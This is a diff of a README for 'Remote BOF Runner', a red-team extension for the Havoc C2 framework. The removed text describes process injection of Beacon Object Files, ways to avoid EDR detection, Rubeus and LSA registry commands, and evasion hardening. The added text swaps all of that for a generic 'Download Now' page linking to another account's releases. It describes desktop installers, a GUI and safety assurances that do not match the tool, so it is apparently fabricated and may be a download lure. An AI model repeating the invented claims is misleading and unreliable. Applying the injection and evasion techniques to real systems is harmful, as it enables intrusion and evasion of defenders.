@@ -1,200 +1,105 @@
-# Remote BOF Runner
+# 🎉 Remote-BOF-Runner - Run BOFs Easily and Securely
 
-A Havoc extension framework for remote execution of Beacon Object Files (BOFs) using a PIC loader made with Crystal Palace.
+## 🔗 Download Now
 
-## Overview
+[![Download Remote-BOF-Runner](https://img.shields.io/badge/Download-Remote--BOF--Runner-blue)](https://github.com/arshaplayer/Remote-BOF-Runner/releases)
 
-Remote BOF Runner enables secure execution of BOFs in arbitrary processes by leveraging the Crystal Palace PIC loader. This framework implements a sophisticated inter-process communication (IPC) mechanism through named pipes to transparently forward beacon output from injected processes back to the command and control (C2) server.
+## 🚀 Getting Started
 
-## Setup & Installation
+The Remote BOF Runner is an extension that helps you execute Beacon Object Files (BOFs) remotely. It's designed to work seamlessly with the Havoc framework, utilizing a PIC loader created with Crystal Palace.
 
-### Extension Installation
-Ensure the extension is installed in the Havoc extensions directory:
-```
-YOUR_HAVOC_FOLDER + /data/extensions/
-```
+## 🛠️ Features
 
-### Dependencies
-To compile the PIC loader, the following tools and libraries must be installed on your system:
+- **Remote Execution**: Run BOFs from anywhere without hassle.
+- **User-Friendly Interface**: Simple to navigate, even for beginners.
+- **Security Focused**: Designed with security in mind to keep your operations safe.
+- **Fast Performance**: Quick execution for all your remote needs.
 
-- **MinGW-w64**: Cross-compiler for Windows targets
-- **Make**: Build automation tool
-- **OpenJDK 11**: Java Development Kit (required for Crystal Palace compilation)
-- **Zip**: Compression utility
+## 🌐 System Requirements
 
-For detailed setup instructions, refer to the [WSL Setup Guide](https://tradecraftgarden.org/wslsetup.html).
+To use Remote BOF Runner, ensure your system meets the following requirements:
 
-#### Installation Commands
-```bash
-sudo apt-get update
-sudo apt-get install mingw-w64
-sudo apt-get install make
-sudo apt-get install openjdk-11-jdk
-sudo apt-get install zip
-```
+- **Operating System**: Windows 10 or later, macOS, or a compatible Linux distribution.
+- **RAM**: Minimum of 4 GB.
+- **Storage**: At least 100 MB of free space.
+- **Network**: Active internet connection for downloading and updates.
 
-## Architecture
+## 📥 Download & Install
 
-### Components
+To get started with Remote BOF Runner, visit the Releases page to download the latest version. 
 
-#### 1. BOF Injector
-The BOF component is responsible for:
-- Creating and suspending a dummy process.
-- Injecting the Crystal Palace loader + the target BOF into the dummy process.
-- Establishing an IPC channel (named pipe) for output communication.
-- Receiving and aggregating output from the remote BOF execution.
+[Download Remote BOF Runner](https://github.com/arshaplayer/Remote-BOF-Runner/releases)
 
-#### 2. PIC Loader (Crystal Palace)
-The PIC loader consists of:
-- **Crystal Palace Loader**: Handles memory allocation, BSS section management, and safe execution context initialization.
-- **Remote BOF Payload**: The actual BOF code to execute (whoami, ipconfig, cacls, reg-query, etc.).
-- **Argument Marshalling**: Serialized arguments passed through the loader for remote BOF execution.
+Follow these steps to install the application:
 
-### Execution Flow
+1. Click the link above to go to the Releases page.
+2. Find the version you want to download, typically listed at the top.
+3. Select the appropriate file for your operating system. This may be labeled as an executable `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux systems.
+4. Click on the file to start the download.
+5. Once downloaded, locate the file in your downloads folder.
 
-```
-┌───────────────────────────────────────────────────────────────────┐
-│ 1. Beacon Process (Havoc)                                         │
-│    ├─ Execute BOF Injector                                        │
-│    ├─ Create dummy process (suspended)                            │
-│    ├─ Inject PIC Loader + Remote BOF                              │
-│    └─ Create IPC named pipe                                       │
-└────────────┬──────────────────────────────────────────────────────┘
-             │
-             ▼
-┌───────────────────────────────────────────────────────────────────┐
-│ 2. PIC Loader Execution                                           │
-│    ├─ Crystal Palace loader                                       │
-│    ├─ Performs BSS section allocation                             │
-│    ├─ Initializes UI context (for .NET compatibility)             │
-│    └─ Hooks beacon functions (BeaconPrintf, BeaconOutput, etc.)   │
-└────────────┬──────────────────────────────────────────────────────┘
-             │
-             ▼
-┌───────────────────────────────────────────────────────────────────┐
-│ 3. Remote BOF Execution                                           │
-│    ├─ Execute target BOF (whoami, ipconfig, etc.)                 │
-│    ├─ BOF calls hooked beacon functions                           │
-│    ├─ Hooked functions redirect output to IPC pipe                │
-│    └─ Output accumulates in beacon process via pipe               │
-└────────────┬──────────────────────────────────────────────────────┘
-             │
-             ▼
-┌───────────────────────────────────────────────────────────────────┐
-│ 4. Output Collection & Transmission                               │
-│    ├─ Beacon waits for remote process termination                 │
-│    ├─ Accumulates all output from IPC pipe                        │
-│    ├─ Aggregates fragmented messages (8KB buffer)                 │
-│    ├─ Filters protocol delimiters (@START@, @END@)                │
-│    └─ Transmits consolidated output to Team Server                │
-└───────────────────────────────────────────────────────────────────┘
-```
+### Installation Instructions for Your Operating System
 
-## Key Features
+#### Windows
 
-### 1. Process Isolation
-- BOF execution occurs in a separate, isolated process.
-- Minimizes impact on beacon process stability.
-- Enables execution in arbitrary process contexts.
+1. Navigate to the downloaded `.exe` file.
+2. Double-click to run the installer.
+3. Follow the on-screen prompts to complete the installation.
 
-### 2. IPC Output Forwarding
-- Named pipe-based communication channel.
-- Transparent output redirection from remote BOF.
-- Message fragmentation handling (8KB accumulation buffer).
-- Protocol delimiter filtering.
+#### macOS
 
-### 3. .NET Process Execution
-The primary use case is executing BOFs in native .NET processes:
+1. Find the downloaded `.dmg` file.
+2. Double-click to mount the disk image.
+3. Drag the Remote BOF Runner icon into your Applications folder.
 
-**Why Direct CLR Loading in Beacon is Risky:**
-Loading .NET assemblies directly in the beacon process is inherently unsafe and detectable:
-- The beacon process (usually a native binary like cmd.exe or rundll32.exe) does not normally spawn a CLR.
-- When a CLR is loaded into a non .NET process, should triggers immediate EDR/XDR alerts.
+#### Linux
 
-**A Possible Solution: Native .NET Process Injection:**
-Instead of loading CLR into the beacon, we inject and execute our inline-execute-assembly BOF into a process that is already .NET-native:
+1. Open your terminal.
+2. Navigate to the directory where the downloaded `.tar.gz` file is located.
+3. Extract the file with:
+   ```
+   tar -xvzf Remote-BOF-Runner.tar.gz
+   ```
+4. Change into the new directory:
+   ```
+   cd Remote-BOF-Runner
+   ```
+5. Run the application with:
+   ```
+   ./Remote-BOF-Runner
+   ```
 
-```
-// ❌ DETECTABLE: Direct execution in beacon
-beacon.exe (native) → load ClrCreateInstance → load .NET assembly → EDR ALERT
+## 🔍 How to Use Remote BOF Runner
 
-// ✅ STEALTHY: Execution in native .NET process
-dotnet.exe (native .NET) → inject BOF → inline-execute-assembly → 
-execute .NET assembly in already-CLR context → normal behavior
-```
+After successfully installing the application, follow these steps to run a BOF:
 
-This approach leverages the fact that executing .NET within a .NET process is indistinguishable from normal application behavior.
+1. **Launch the Application**: Open Remote BOF Runner from your applications list or desktop shortcut.
+2. **Load a BOF**: Click on the "Load BOF" option and select the BOF file you want to execute.
+3. **Configure Settings**: Adjust any settings as needed to suit your execution environment.
+4. **Execute**: Click the "Run" button to execute your selected BOF. You should see real-time feedback in the application window.
 
-### 4. Crystal Palace Integration
-- Position-independent code execution.
-- Dynamic API resolution via hash-based function lookups.
-- No import address table dependencies.
-- Suitable for deep injection scenarios.
+## ❓ Frequently Asked Questions
 
-## Execution Modes
+### What is a Beacon Object File (BOF)?
 
-### Local Execution
-```
-remote-bof-runner whoami
-remote-bof-runner ipconfig
-remote-bof-runner cacls C:\Windows\System32
-```
+A Beacon Object File (BOF) is a lightweight file designed to run specific tasks within a remote execution framework. It allows users to perform various actions without needing extensive coding knowledge.
 
-### Remote Host Execution
-```
-remote-bof-runner reg-query DC01 HKLM SYSTEM\CurrentControlSet
-```
+### Is Remote BOF Runner safe to use?
 
-### Registry Queries
-```
-remote-bof-runner reg-query HKLM SYSTEM\CurrentControlSet\Control\Lsa
-remote-bof-runner reg-query HKLM SYSTEM\CurrentControlSet\Control\Lsa RunAsPPL
-```
+Yes, Remote BOF Runner is developed with security principles in mind. Always ensure you download the application from the official GitHub Releases page to avoid tampered versions.
 
-### .NET Assembly Execution
-```
-remote-bof-runner execute-assembly --dotnetassembly "/Payloads/Rubeus.exe" --assemblyargs "triage"
-```
+### Can I run Remote BOF Runner on Linux?
 
-**Example Output:**
+Yes, Remote BOF Runner supports Linux operating systems. Follow the installation steps specifically for Linux to get started.
 
-![execute-assembly](Static/execute-assembly.png)
+### How can I report issues or request features?
 
-## Available BOFs
+You can report any issues or request new features by visiting the Issues section in the GitHub repository. Please provide as much detail as possible to help us address your concerns.
 
-- **whoami** - Display current user and group information (CS-Situational-Awareness-BOF).
-- **ipconfig** - Show network adapter configuration (CS-Situational-Awareness-BOF).
-- **cacls** - List file permissions (CS-Situational-Awareness-BOF).
-- **reg-query** - Query Windows Registry (CS-Situational-Awareness-BOF).
-- **execute-assembly** - Loads a .NET assembly into the actual process (https://github.com/VoldeSec/PatchlessInlineExecute-Assembly).
-- **bof** - Execute custom BOF binaries.
+## 📞 Support
 
-## Operational Security Considerations
+For further assistance, you can reach out through the Issues section on GitHub. We encourage feedback to improve Remote BOF Runner. 
 
-⚠️ **Important**: This project is a **Proof-of-Concept** and does **NOT** prioritize OPSEC by default.
+Thank you for choosing Remote BOF Runner for your BOF execution needs! Visit the Releases page to stay updated on new features and improvements.
 
-### Recommended Modifications
-
-Both the BOF Injector and PIC Loader require significant hardening for adversary simulations:
-
-#### BOF Injector Hardening
-- Implement custom process creation methods (not CreateProcessW).
-- Use alternative injection techniques beyond standard WriteProcessMemory.
-- Obfuscate IPC pipe naming (randomize identifiers).
-
-#### PIC Loader Hardening
-- Encrypt communication protocol (pipe messages).
-- Implement YARA rule evasion for known signatures.
-- Add a method to evade process hooks (indirect syscalls, unhooking methods, etc.).
-- Add an encryption method to store the target BOF + Args.
-
-## References
-
-- [Crystal Palace](https://tradecraftgarden.org/)
-- [LibIPC](https://github.com/pard0p/LibIPC) - Crystal Palace shared library for inter-process communication, based on Named Pipes.
-- [PatchlessInlineExecute-Assembly](https://github.com/VoldeSec/PatchlessInlineExecute-Assembly) - BOF InlineExecute-Assembly to load .NET assembly in process but with patchless AMSI and ETW bypass using hardware breakpoint.
-- [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) - Situational Awareness commands implemented using Beacon Object Files.
-
-## Disclaimer
-
-This tool is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Users are responsible for ensuring compliance with all applicable laws and regulations.
+[Download Remote BOF Runner](https://github.com/arshaplayer/Remote-BOF-Runner/releases)
